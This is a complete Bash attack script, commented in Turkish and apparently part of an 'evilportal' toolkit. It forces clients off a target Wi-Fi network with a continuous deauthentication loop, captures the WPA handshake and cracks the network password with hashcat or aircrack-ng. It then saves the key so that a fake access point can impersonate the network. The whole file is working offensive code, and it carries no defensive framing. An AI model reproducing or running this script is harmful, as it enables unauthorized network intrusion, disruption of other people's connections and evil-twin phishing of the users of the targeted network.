#!/usr/bin/env bash
# ==============================================================
#  evilportal — WPA handshake yakala + kır
#  Bulunan PSK'yi capture/psk.txt'e yazar.
#
#  Kullanım:
#    sudo ./autopwn.sh [BSSID] [KANAL] [SSID] [WORDLIST] [IFACE] [TIMEOUT]
#
#  Akış:
#    monitor mode → airodump-ng + deauth döngüsü → handshake →
#    hashcat (varsa) / aircrack-ng → PSK
# ==============================================================
set -uo pipefail

BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$BASE/config.sh"

BSSID="${1:-$TARGET_BSSID}"
CHAN="${2:-$CHANNEL}"
SSID="${3:-$TARGET_SSID}"
WORDLIST="${4:-${WORDLIST:-/usr/share/wordlists/rockyou.txt}}"
IFACE="${5:-$MON_IF}"
TIMEOUT="${6:-${CAPTURE_TIMEOUT:-60}}"

log(){ echo "[*] $*"; }
ok(){  echo "[+] $*"; }
err(){ echo "[-] $*"; }

[[ $EUID -eq 0 ]] || { err "root gerekli"; exit 1; }

for b in airodump-ng aireplay-ng aircrack-ng; do
  command -v "$b" >/dev/null 2>&1 || { err "$b yok — apt install aircrack-ng"; exit 1; }
done

[[ -r "$WORDLIST" ]] || {
  err "wordlist okunamıyor: $WORDLIST"
  [[ -e "${WORDLIST}.gz" ]] && err "sıkıştırılmış: gunzip ${WORDLIST}.gz"
  exit 1
}

WORK="$BASE/capture/hs_$(printf '%s' "$BSSID" | tr -d ':')"
rm -rf "$WORK"
mkdir -p "$WORK" "$BASE/capture"
rm -f "$BASE/capture/psk.txt"

log "hedef      : $SSID ($BSSID), kanal $CHAN"
log "arayüz     : $IFACE"
log "wordlist   : $WORDLIST"
log "zaman aşımı: ${TIMEOUT}s"

airmon-ng check kill >/dev/null 2>&1 || true
ip link set "$IFACE" down 2>/dev/null
iw dev "$IFACE" set type monitor 2>/dev/null
ip link set "$IFACE" up
iw dev "$IFACE" set channel "$CHAN" 2>/dev/null || { err "kanal $CHAN ayarlanamadı"; exit 1; }
iw dev "$IFACE" set power_save off 2>/dev/null || true

DUMP=""
DEAUTH=""
cleanup(){
  if [[ -n "$DEAUTH" ]]; then
    pkill -P "$DEAUTH" 2>/dev/null
    kill "$DEAUTH" 2>/dev/null
  fi
  [[ -n "$DUMP" ]] && kill "$DUMP" 2>/dev/null
  wait 2>/dev/null
}
trap cleanup EXIT INT TERM

log "airodump-ng başlıyor"
airodump-ng -c "$CHAN" --bssid "$BSSID" --output-format pcap \
  -w "$WORK/cap" "$IFACE" > "$WORK/airodump.log" 2>&1 &
DUMP=$!

log "deauth döngüsü başlıyor"
(
  while :; do
    aireplay-ng --deauth 5 -a "$BSSID" "$IFACE" >/dev/null 2>&1
    sleep 2
  done
) &
DEAUTH=$!

CAPFILE=""
for ((i = 1; i <= TIMEOUT; i++)); do
  sleep 1
  for f in "$WORK"/cap*.cap; do
    [[ -e "$f" ]] || continue
    if aircrack-ng "$f" 2>/dev/null | grep -qE "[1-9][0-9]* handshake"; then
      CAPFILE="$f"
      break 2
    fi
  done
  (( i % 10 == 0 )) && log "${i}s… handshake yok"
done

if [[ -z "$CAPFILE" ]]; then
  err "handshake yakalanamadı (${TIMEOUT}s)"
  err "AP'ye bağlı aktif bir istemci gerekir; kanal/SSID'yi doğrula"
  exit 2
fi

ok "handshake yakalandı: $(basename "$CAPFILE")"
cleanup
trap - EXIT INT TERM

log "kırma başlıyor…"
PSK=""

if command -v hashcat >/dev/null 2>&1 && command -v hcxpcapngtool >/dev/null 2>&1; then
  if hcxpcapngtool -o "$WORK/hs.22000" "$CAPFILE" >/dev/null 2>&1 && [[ -s "$WORK/hs.22000" ]]; then
    log "hashcat (-m 22000) kullanılıyor"
    hashcat -m 22000 "$WORK/hs.22000" "$WORDLIST" \
      --potfile-path "$WORK/hs.pot" --quiet > "$WORK/hashcat.log" 2>&1
    PSK=$(hashcat -m 22000 "$WORK/hs.22000" --show \
      --potfile-path "$WORK/hs.pot" 2>/dev/null | head -n1 | cut -d: -f2-)
  fi
fi

if [[ -z "$PSK" ]]; then
  log "aircrack-ng kullanılıyor"
  RESULT=$(aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAPFILE" 2>/dev/null | grep -i "KEY FOUND")
  PSK=$(printf '%s' "$RESULT" | sed -n 's/.*\[\(.*\)\].*/\1/p')
fi

if [[ -z "$PSK" ]]; then
  err "PSK bulunamadı — wordlist yetersiz"
  err "daha büyük veya hedefe özel bir wordlist dene"
  exit 3
fi

printf '%s' "$PSK" > "$BASE/capture/psk.txt"
echo
ok "PSK=$PSK"
ok "capture/psk.txt yazıldı — sahte AP bu parola ile açılabilir"
